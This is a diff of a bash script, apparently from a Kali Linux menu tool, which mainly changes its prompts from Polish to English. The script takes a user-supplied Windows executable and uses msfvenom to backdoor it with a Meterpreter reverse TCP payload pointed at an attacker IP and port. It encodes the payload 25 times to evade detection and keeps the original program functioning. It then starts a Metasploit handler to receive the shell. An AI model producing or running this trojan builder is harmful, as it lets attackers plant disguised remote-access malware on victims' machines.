@@ -13,30 +13,53 @@ echo "
        ░      ░  ░              ░  ░      ░               ░  ░    ░ ░   ░                                                                                              
 "
 echo "Startuję skrypt ..."
-echo "Podaj lokalizację pliku exe do przebudowania: "
-read LOKALIZACJA
-echo "Przenoszę plik do /home/kali/Desktop/ ..."
+read -r -p "Input exe file patch - " LOKALIZACJA
+echo "Moving file to /home/kali/Desktop/ ..."
 mv $LOKALIZACJA /home/kali/Desktop/
 cd /home/kali/Desktop
-echo "Podaj nazwe pliku do przebudowania: "
-read NAZWA
-echo "Podaj ip ładunku: "
-read IP
-echo "Podaj port ładunku: "
-read PORT
-echo "Podaj nazwe ładunku po kompilacji: "
-read LADUNEK
+read -r -p "Input the name of exe file - " NAZWA
+read -r -p "Input the payload IP adress - " IP
+read -r -p "Input the payload port - " PORT
+read -r -p "Input the payload name - " LADUNEK
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
-echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
-read ODPOWIEDZ
-if [ $ODPOWIEDZ == "Y" ]
-then
+while true
+do
+ read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
+ 
+ case $ODPOWIEDZ in
+     [y][eE][sS]|[y])
   echo "Uruchamiam skrypt... "
   sleep 3
   sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
-else
-  echo "Kończę działanie skryptu ..."
-fi
-cd /home/kali/Desktop/K0Z1OLMENU
-sudo ./K0Z1OLMENU
-
+  sudo ./K0Z1OLMENU.sh
+ break
+ ;;
+     [n][eE][sS]|[n])
+ break
+        ;;
+     *)
+ echo "Invalid input..."
+ ;;
+  esac
+done
+while true
+do
+ read -r -p "Do you want start script again ? (y/n) - " ODPOWIEDZ2
+ 
+ case $ODPOWIEDZ2 in
+     [y][eE][sS]|[y])
+  echo "Uruchamiam skrypt... "
+  cd ..
+  sudo ./K0Z1OLMENU.sh
+ break
+ ;;
+     [n][eE][sS]|[n])
+  echo "Thanks for using my script !"
+  exit 1
+ break
+        ;;
+     *)
+ echo "Invalid input..."
+ ;;
+  esac
+done
